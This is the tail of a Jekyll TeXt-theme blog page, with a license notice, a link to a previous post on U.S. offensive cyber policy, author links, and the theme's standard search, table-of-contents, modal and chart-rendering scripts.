    <p>This work is licensed under a <a itemprop="license" rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">Attribution-NonCommercial 4.0 International</a> license.
      <a rel="license" href="https://creativecommons.org/licenses/by-nc/4.0/">
        <img alt="Attribution-NonCommercial 4.0 International" src="https://i.creativecommons.org/l/by-nc/4.0/88x31.png" />
      </a>
    </p>
  </div></div></footer>
<div class="article__section-navigator clearfix"><div class="previous"><span>PREVIOUS</span><a href="/2025/05/30/us-cyber-policy-zero-day-retention.html">Ready, Retain, Fire? The Quiet Fallout of U.S. Offensive Cyber Policy</a></div></div></div>

</div>

<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    $(function() {
      var $this ,$scroll;
      var $articleContent = $('.js-article-content');
      var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
      var scroll = hasSidebar ? '.js-page-main' : 'html, body';
      $scroll = $(scroll);

      $articleContent.find('.highlight').each(function() {
        $this = $(this);
        $this.attr('data-lang', $this.find('code').attr('data-lang'));
      });
      $articleContent.find('h1[id], h2[id], h3[id], h4[id], h5[id], h6[id]').each(function() {
        $this = $(this);
        $this.append($('<a class="anchor d-print-none" aria-hidden="true"></a>').html('<i class="fas fa-anchor"></i>'));
      });
      $articleContent.on('click', '.anchor', function() {
        $scroll.scrollToAnchor('#' + $(this).parent().attr('id'), 400);
      });
    });
  });
})();
</script>
</div><section class="page__comments d-print-none"></section></article><!-- start custom main bottom snippet -->

<!-- end custom main bottom snippet -->
</div>
            </div></div></div><div class="page__footer d-print-none">
<footer class="footer py-4 js-page-footer">
  <div class="main"><div itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Max"><meta itemprop="url" content="https://maximand.github.io"><meta itemprop="description" content="Scan all the things"><div class="footer__author-links"><div class="author-links">
  <ul class="menu menu--nowrap menu--inline"><link itemprop="url" href="https://maximand.github.io"><li title="Send me an Email.">
      <a class="button button--circle mail-button" itemprop="email" href="mailto:mhvanderhorst@tudelft.nl" target="_blank">
        <i class="fas fa-envelope"></i>
      </a><li title="Follow me on Linkedin.">
        <a class="button button--circle linkedin-button" itemprop="sameAs" href="https://www.linkedin.com/in/maxhorst" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path d="M260.096 155.648c0 27.307008-9.899008 50.516992-29.696 69.632-19.796992 19.115008-45.396992 28.672-76.8 28.672-30.036992 0-54.612992-9.556992-73.728-28.672-19.115008-19.115008-28.672-42.324992-28.672-69.632 0-28.672 9.556992-52.224 28.672-70.656 19.115008-18.432 44.372992-27.648 75.776-27.648 31.403008 0 56.32 9.216 74.752 27.648 18.432 18.432 28.331008 41.984 29.696 70.656 0 0 0 0 0 0m-202.752 808.96c0 0 0-632.832 0-632.832 0 0 196.608 0 196.608 0 0 0 0 632.832 0 632.832 0 0-196.608 0-196.608 0 0 0 0 0 0 0m313.344-430.08c0-58.708992-1.364992-126.292992-4.096-202.752 0 0 169.984 0 169.984 0 0 0 10.24 88.064 10.24 88.064 0 0 4.096 0 4.096 0 40.96-68.267008 105.812992-102.4 194.56-102.4 68.267008 0 123.220992 22.868992 164.864 68.608 41.643008 45.739008 62.464 113.664 62.464 203.776 0 0 0 374.784 0 374.784 0 0-196.608 0-196.608 0 0 0 0-350.208 0-350.208 0-91.476992-33.451008-137.216-100.352-137.216-47.787008 0-81.236992 24.576-100.352 73.728-4.096 8.192-6.144 24.576-6.144 49.152 0 0 0 364.544 0 364.544 0 0-198.656 0-198.656 0 0 0 0-430.08 0-430.08 0 0 0 0 0 0" />
</svg>
</div>
        </a>
      </li><li title="Follow me on Github.">
        <a class="button button--circle github-button" itemprop="sameAs" href="https://github.com/Maximand# "user_name" the last part of your profile url, e.g. https://github.com/user_name" target="_blank">
          <div class="icon"><svg fill="#000000" width="24px" height="24px" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
  <path class="svgpath" data-index="path_0" fill="#272636" d="M0 525.2c0 223.6 143.3 413.7 343 483.5 26.9 6.8 22.8-12.4 22.8-25.4l0-88.7c-155.3 18.2-161.5-84.6-172-101.7-21.1-36-70.8-45.2-56-62.3 35.4-18.2 71.4 4.6 113.1 66.3 30.2 44.7 89.1 37.2 119 29.7 6.5-26.9 20.5-50.9 39.7-69.6C248.8 728.2 181.7 630 181.7 513.2c0-56.6 18.7-108.7 55.3-150.7-23.3-69.3 2.2-128.5 5.6-137.3 66.5-6 135.5 47.6 140.9 51.8 37.8-10.2 80.9-15.6 129.1-15.6 48.5 0 91.8 5.6 129.8 15.9 12.9-9.8 77-55.8 138.8-50.2 3.3 8.8 28.2 66.7 6.3 135 37.1 42.1 56 94.6 56 151.4 0 117-67.5 215.3-228.8 243.7 26.9 26.6 43.6 63.4 43.6 104.2l0 128.8c0.9 10.3 0 20.5 17.2 20.5C878.1 942.4 1024 750.9 1024 525.3c0-282.9-229.3-512-512-512C229.1 13.2 0 242.3 0 525.2L0 525.2z" />
</svg>
</div>
        </a>
      </li></ul>
</div>
</div>
    </div><div class="site-info mt-2">
      <div>© Disclosing.Observer 2025,
        Powered by <a title="Jekyll is a simple, blog-aware, static site generator." href="http://jekyllrb.com/">Jekyll</a> & <a
        title="TeXt is a super customizable Jekyll theme." href="https://github.com/kitian616/jekyll-TeXt-theme">TeXt Theme</a>.
      </div>
    </div>
  </div>
</footer>
</div></div>
    </div><script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $body = $('body'), $window = $(window);
    var $pageRoot = $('.js-page-root'), $pageMain = $('.js-page-main');
    var activeCount = 0;
    function modal(options) {
      var $root = this, visible, onChange, hideWhenWindowScroll = false;
      var scrollTop;
      function setOptions(options) {
        var _options = options || {};
        visible = _options.initialVisible === undefined ? false : show;
        onChange = _options.onChange;
        hideWhenWindowScroll = _options.hideWhenWindowScroll;
      }
      function init() {
        setState(visible);
      }
      function setState(isShow) {
        if (isShow === visible) {
          return;
        }
        visible = isShow;
        if (visible) {
          activeCount++;
          scrollTop = $(window).scrollTop() || $pageMain.scrollTop();
          $root.addClass('modal--show');
          $pageMain.scrollTop(scrollTop);
          activeCount === 1 && ($pageRoot.addClass('show-modal'), $body.addClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.on('scroll', hide);
          $window.on('keyup', handleKeyup);
        } else {
          activeCount > 0 && activeCount--;
          $root.removeClass('modal--show');
          $window.scrollTop(scrollTop);
          activeCount === 0 && ($pageRoot.removeClass('show-modal'), $body.removeClass('of-hidden'));
          hideWhenWindowScroll && window.hasEvent('touchstart') && $window.off('scroll', hide);
          $window.off('keyup', handleKeyup);
        }
        onChange && onChange(visible);
      }
      function show() {
        setState(true);
      }
      function hide() {
        setState(false);
      }
      function handleKeyup(e) {
        // Char Code: 27  ESC
        if (e.which ===  27) {
          hide();
        }
      }
      setOptions(options);
      init();
      return {
        show: show,
        hide: hide,
        $el: $root
      };
    }
    $.fn.modal = modal;
  });
})();
</script><div class="modal modal--overflow page__search-modal d-print-none js-page-search-modal"><script>
(function () {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    // search panel
    var search = (window.search || (window.search = {}));
    var useDefaultSearchBox = window.useDefaultSearchBox === undefined ?
      true : window.useDefaultSearchBox ;

    var $searchModal = $('.js-page-search-modal');
    var $searchToggle = $('.js-search-toggle');
    var searchModal = $searchModal.modal({ onChange: handleModalChange, hideWhenWindowScroll: true });
    var modalVisible = false;
    search.searchModal = searchModal;

    var $searchBox = null;
    var $searchInput = null;
    var $searchClear = null;

    function getModalVisible() {
      return modalVisible;
    }
    search.getModalVisible = getModalVisible;

    function handleModalChange(visible) {
      modalVisible = visible;
      if (visible) {
        search.onShow && search.onShow();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].focus();
      } else {
        search.onShow && search.onHide();
        useDefaultSearchBox && $searchInput[0] && $searchInput[0].blur();
        setTimeout(function() {
          useDefaultSearchBox && ($searchInput.val(''), $searchBox.removeClass('not-empty'));
          search.clear && search.clear();
          window.pageAsideAffix && window.pageAsideAffix.refresh();
        }, 400);
      }
    }

    $searchToggle.on('click', function() {
      modalVisible ? searchModal.hide() : searchModal.show();
    });
    // Char Code: 83  S, 191 /
    $(window).on('keyup', function(e) {
      if (!modalVisible && !window.isFormElement(e.target || e.srcElement) && (e.which === 83 || e.which === 191)) {
        modalVisible || searchModal.show();
      }
    });

    if (useDefaultSearchBox) {
      $searchBox = $('.js-search-box');
      $searchInput = $searchBox.children('input');
      $searchClear = $searchBox.children('.js-icon-clear');
      search.getSearchInput = function() {
        return $searchInput.get(0);
      };
      search.getVal = function() {
        return $searchInput.val();
      };
      search.setVal = function(val) {
        $searchInput.val(val);
      };

      $searchInput.on('focus', function() {
        $(this).addClass('focus');
      });
      $searchInput.on('blur', function() {
        $(this).removeClass('focus');
      });
      $searchInput.on('input', window.throttle(function() {
        var val = $(this).val();
        if (val === '' || typeof val !== 'string') {
          search.clear && search.clear();
        } else {
          $searchBox.addClass('not-empty');
          search.onInputNotEmpty && search.onInputNotEmpty(val);
        }
      }, 400));
      $searchClear.on('click', function() {
        $searchInput.val(''); $searchBox.removeClass('not-empty');
        search.clear && search.clear();
      });
    }
  });
})();
</script><div class="search search--dark">
  <div class="main">
    <div class="search__header">Search</div>
    <div class="search-bar">
      <div class="search-box js-search-box">
        <div class="search-box__icon-search"><i class="fas fa-search"></i></div>
        <input type="text" />
        <div class="search-box__icon-clear js-icon-clear">
          <a><i class="fas fa-times"></i></a>
        </div>
      </div>
      <button class="button button--theme-dark button--pill search__cancel js-search-toggle">
        Cancel</button>
    </div>
    <div class="search-result js-search-result"></div>
  </div>
</div>
<script>var SOURCES = window.TEXT_VARIABLES.sources;
var PAHTS = window.TEXT_VARIABLES.paths;
window.Lazyload.js([SOURCES.jquery, PAHTS.search_js], function() {
  var search = (window.search || (window.search = {}));
  var searchData = window.TEXT_SEARCH_DATA || {};

  function memorize(f) {
    var cache = {};
    return function () {
      var key = Array.prototype.join.call(arguments, ',');
      if (key in cache) return cache[key];
      else return cache[key] = f.apply(this, arguments);
    };
  }

  /// search
  function searchByQuery(query) {
    var i, j, key, keys, cur, _title, result = {};
    keys = Object.keys(searchData);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      for (j = 0; j < searchData[key].length; j++) {
        cur = searchData[key][j], _title = cur.title;
        if ((result[key] === undefined || result[key] && result[key].length < 4 )
          && _title.toLowerCase().indexOf(query.toLowerCase()) >= 0) {
          if (result[key] === undefined) {
            result[key] = [];
          }
          result[key].push(cur);
        }
      }
    }
    return result;
  }

  var renderHeader = memorize(function(header) {
    return $('<p class="search-result__header">' + header + '</p>');
  });

  var renderItem = function(index, title, url) {
    return $('<li class="search-result__item" data-index="' + index + '"><a class="button" href="' + url + '">' + title + '</a></li>');
  };

  function render(data) {
    if (!data) { return null; }
    var $root = $('<ul></ul>'), i, j, key, keys, cur, itemIndex = 0;
    keys = Object.keys(data);
    for (i = 0; i < keys.length; i++) {
      key = keys[i];
      $root.append(renderHeader(key));
      for (j = 0; j < data[key].length; j++) {
        cur = data[key][j];
        $root.append(renderItem(itemIndex++, cur.title, cur.url));
      }
    }
    return $root;
  }

  // search box
  var $result = $('.js-search-result'), $resultItems;
  var lastActiveIndex, activeIndex;

  function clear() {
    $result.html(null);
    $resultItems = $('.search-result__item'); activeIndex = 0;
  }
  function onInputNotEmpty(val) {
    $result.html(render(searchByQuery(val)));
    $resultItems = $('.search-result__item'); activeIndex = 0;
    $resultItems.eq(0).addClass('active');
  }

  search.clear = clear;
  search.onInputNotEmpty = onInputNotEmpty;

  function updateResultItems() {
    lastActiveIndex >= 0 && $resultItems.eq(lastActiveIndex).removeClass('active');
    activeIndex >= 0 && $resultItems.eq(activeIndex).addClass('active');
  }

  function moveActiveIndex(direction) {
    var itemsCount = $resultItems ? $resultItems.length : 0;
    if (itemsCount > 1) {
      lastActiveIndex = activeIndex;
      if (direction === 'up') {
        activeIndex = (activeIndex - 1 + itemsCount) % itemsCount;
      } else if (direction === 'down') {
        activeIndex = (activeIndex + 1 + itemsCount) % itemsCount;
      }
      updateResultItems();
    }
  }

  // Char Code: 13  Enter, 37  ⬅, 38  ⬆, 39  ➡, 40  ⬇
  $(window).on('keyup', function(e) {
    var modalVisible = search.getModalVisible && search.getModalVisible();
    if (modalVisible) {
      if (e.which === 38) {
        modalVisible && moveActiveIndex('up');
      } else if (e.which === 40) {
        modalVisible && moveActiveIndex('down');
      } else if (e.which === 13) {
        modalVisible && $resultItems && activeIndex >= 0 && $resultItems.eq(activeIndex).children('a')[0].click();
      }
    }
  });

  $result.on('mouseover', '.search-result__item > a', function() {
    var itemIndex = $(this).parent().data('index');
    itemIndex >= 0 && (lastActiveIndex = activeIndex, activeIndex = itemIndex, updateResultItems());
  });
});
</script>
</div></div>


<script>(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function scrollToAnchor(anchor, duration, callback) {
      var $root = this;
      $root.animate({ scrollTop: $(anchor).position().top }, duration, function() {
        window.history.replaceState(null, '', window.location.href.split('#')[0] + anchor);
        callback && callback();
      });
    }
    $.fn.scrollToAnchor = scrollToAnchor;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function affix(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroll,
        offsetBottom = 0, scrollTarget = window, scroll = window.document, disabled = false, isOverallScroller = true,
        rootTop, rootLeft, rootHeight, scrollBottom, rootBottomTop,
        hasInit = false, curState;

      function setOptions(options) {
        var _options = options || {};
        _options.offsetBottom && (offsetBottom = _options.offsetBottom);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroll && (scroll = _options.scroll);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $scrollTarget = $(scrollTarget);
        isOverallScroller = window.isOverallScroller($scrollTarget[0]);
        $scroll = $(scroll);
      }
      function preCalc() {
        top();
        rootHeight = $root.outerHeight();
        rootTop = $root.offset().top + (isOverallScroller ? 0 :  $scrollTarget.scrollTop());
        rootLeft = $root.offset().left;
      }
      function calc(needPreCalc) {
        needPreCalc && preCalc();
        scrollBottom = $scroll.outerHeight() - offsetBottom - rootHeight;
        rootBottomTop = scrollBottom - rootTop;
      }
      function top() {
        if (curState !== 'top') {
          $root.removeClass('fixed').css({
            left: 0,
            top: 0
          });
          curState = 'top';
        }
      }
      function fixed() {
        if (curState !== 'fixed') {
          $root.addClass('fixed').css({
            left: rootLeft + 'px',
            top: 0
          });
          curState = 'fixed';
        }
      }
      function bottom() {
        if (curState !== 'bottom') {
          $root.removeClass('fixed').css({
            left: 0,
            top: rootBottomTop + 'px'
          });
          curState = 'bottom';
        }
      }
      function setState() {
        var scrollTop = $scrollTarget.scrollTop();
        if (scrollTop >= rootTop && scrollTop <= scrollBottom) {
          fixed();
        } else if (scrollTop < rootTop) {
          top();
        } else {
          bottom();
        }
      }
      function init() {
        if(!hasInit) {
          var interval, timeout;
          calc(true); setState();
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState();
          });
          $window.on('resize', function() {
            disabled || (calc(true), setState());
          });
          hasInit = true;
        }
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions,
        refresh: function() {
          calc(true, { animation: false }); setState();
        }
      };
    }
    $.fn.affix = affix;
  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    function toc(options) {
      var $root = this, $window = $(window), $scrollTarget, $scroller, $tocUl = $('<ul class="toc toc--ellipsis"></ul>'), $tocLi, $headings, $activeLast, $activeCur,
        selectors = 'h1,h2,h3', container = 'body', scrollTarget = window, scroller = 'html, body', disabled = false,
        headingsPos, scrolling = false, hasRendered = false, hasInit = false;

      function setOptions(options) {
        var _options = options || {};
        _options.selectors && (selectors = _options.selectors);
        _options.container && (container = _options.container);
        _options.scrollTarget && (scrollTarget = _options.scrollTarget);
        _options.scroller && (scroller = _options.scroller);
        _options.disabled !== undefined && (disabled = _options.disabled);
        $headings = $(container).find(selectors).filter('[id]');
        $scrollTarget = $(scrollTarget);
        $scroller = $(scroller);
      }
      function calc() {
        headingsPos = [];
        $headings.each(function() {
          headingsPos.push(Math.floor($(this).position().top));
        });
      }
      function setState(element, disabled) {
        var scrollTop = $scrollTarget.scrollTop(), i;
        if (disabled || !headingsPos || headingsPos.length < 1) { return; }
        if (element) {
          $activeCur = element;
        } else {
          for (i = 0; i < headingsPos.length; i++) {
            if (scrollTop >= headingsPos[i]) {
              $activeCur = $tocLi.eq(i);
            } else {
              $activeCur || ($activeCur = $tocLi.eq(i));
              break;
            }
          }
        }
        $activeLast && $activeLast.removeClass('active');
        ($activeLast = $activeCur).addClass('active');
      }
      function render() {
        if(!hasRendered) {
          $root.append($tocUl);
          $headings.each(function() {
            var $this = $(this);
            $tocUl.append($('<li></li>').addClass('toc-' + $this.prop('tagName').toLowerCase())
              .append($('<a></a>').text($this.text()).attr('href', '#' + $this.prop('id'))));
          });
          $tocLi = $tocUl.children('li');
          $tocUl.on('click', 'a', function(e) {
            e.preventDefault();
            var $this = $(this);
            scrolling = true;
            setState($this.parent());
            $scroller.scrollToAnchor($this.attr('href'), 400, function() {
              scrolling = false;
            });
          });
        }
        hasRendered = true;
      }
      function init() {
        var interval, timeout;
        if(!hasInit) {
          render(); calc(); setState(null, scrolling);
          // run calc every 100 millisecond
          interval = setInterval(function() {
            calc();
          }, 100);
          timeout = setTimeout(function() {
            clearInterval(interval);
          }, 45000);
          window.pageLoad.then(function() {
            setTimeout(function() {
              clearInterval(interval);
              clearTimeout(timeout);
            }, 3000);
          });
          $scrollTarget.on('scroll', function() {
            disabled || setState(null, scrolling);
          });
          $window.on('resize', window.throttle(function() {
            if (!disabled) {
              render(); calc(); setState(null, scrolling);
            }
          }, 100));
        }
        hasInit = true;
      }

      setOptions(options);
      if (!disabled) {
        init();
      }
      $window.on('resize', window.throttle(function() {
        init();
      }, 200));
      return {
        setOptions: setOptions
      };
    }
    $.fn.toc = toc;
  });
})();
/*(function () {

})();*/
</script><script>
  /* toc must before affix, since affix need to konw toc' height. */(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  var TOC_SELECTOR = window.TEXT_VARIABLES.site.toc.selectors;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window);
    var $articleContent = $('.js-article-content');
    var $tocRoot = $('.js-toc-root'), $col2 = $('.js-col-aside');
    var toc;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');
    var hasToc = $articleContent.find(TOC_SELECTOR).length > 0;

    function disabled() {
      return $col2.css('display') === 'none' || !hasToc;
    }

    tocDisabled = disabled();

    toc = $tocRoot.toc({
      selectors: TOC_SELECTOR,
      container: $articleContent,
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      tocDisabled = disabled();
      toc && toc.setOptions({
        disabled: tocDisabled
      });
    }, 100));

  });
})();
(function() {
  var SOURCES = window.TEXT_VARIABLES.sources;
  window.Lazyload.js(SOURCES.jquery, function() {
    var $window = $(window), $pageFooter = $('.js-page-footer');
    var $pageAside = $('.js-page-aside');
    var affix;
    var tocDisabled = false;
    var hasSidebar = $('.js-page-root').hasClass('layout--page--sidebar');

    affix = $pageAside.affix({
      offsetBottom: $pageFooter.outerHeight(),
      scrollTarget: hasSidebar ? '.js-page-main' : null,
      scroller: hasSidebar ? '.js-page-main' : null,
      scroll: hasSidebar ? $('.js-page-main').children() : null,
      disabled: tocDisabled
    });

    $window.on('resize', window.throttle(function() {
      affix && affix.setOptions({
        disabled: tocDisabled
      });
    }, 100));

    window.pageAsideAffix = affix;
  });
})();
</script><script>
  window.Lazyload.js(['https://cdn.bootcss.com/jquery/3.1.1/jquery.min.js', 'https://cdn.bootcss.com/Chart.js/2.7.2/Chart.bundle.min.js'], function() {
    var $canvas = null, $this = null, _ctx = null, _text = '';
    $('.language-chart').each(function(){
      $this = $(this);
      $canvas = $('<canvas></canvas>');
      _text = $this.text();
      $this.text('').append($canvas);
      _ctx = $canvas.get(0).getContext('2d');
      (_ctx && _text) && (new Chart(_ctx, JSON.parse(_text)) && $this.attr('data-processed', true));
    });
  });
</script>
<script type="text/x-mathjax-config">
	var _config = { tex2jax: {
		inlineMath: [['$','$'], ['\\(','\\)']]
	}};_config.TeX = { equationNumbers: { autoNumber: "all" } };MathJax.Hub.Config(_config);
</script>
<script type="text/javascript" src="https://cdn.bootcss.com/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
<script>
  window.Lazyload.js('https://cdn.bootcss.com/mermaid/8.0.0-rc.8/mermaid.min.js', function() {
    mermaid.initialize({
      startOnLoad: true
    });
    mermaid.init(undefined, '.language-mermaid');
  });
</script>

    </div>
    <script>(function () {
  var $root = document.getElementsByClassName('root')[0];
  if (window.hasEvent('touchstart')) {
    $root.dataset.isTouch = true;
    document.addEventListener('touchstart', function(){}, false);
  }
})();
</script>
  </body>
</html>

